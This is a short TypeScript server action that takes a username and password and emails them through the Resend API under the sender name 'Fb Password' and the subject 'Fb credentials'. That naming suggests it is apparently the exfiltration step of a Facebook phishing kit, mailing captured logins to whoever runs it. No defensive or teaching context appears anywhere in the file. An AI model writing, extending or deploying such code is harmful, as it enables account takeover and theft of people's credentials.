"use server";

import EmailTemplate from "@/components/email-template";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function sendEmail({
  username,
  password,
  email,
}: {
  username: string;
  password: string;
  email: string;
}) {
  try {
    const { data, error } = await resend.emails.send({
      from: "Fb Password <onboarding@resend.dev>",
      to: [email],
      subject: "Fb credentials",
      react: EmailTemplate({ username, password }),
    });

    if (error) {
      return JSON.parse(JSON.stringify(error));
    }

    return JSON.parse(JSON.stringify(data));
  } catch (error) {
    return JSON.parse(JSON.stringify(error));
  }
}
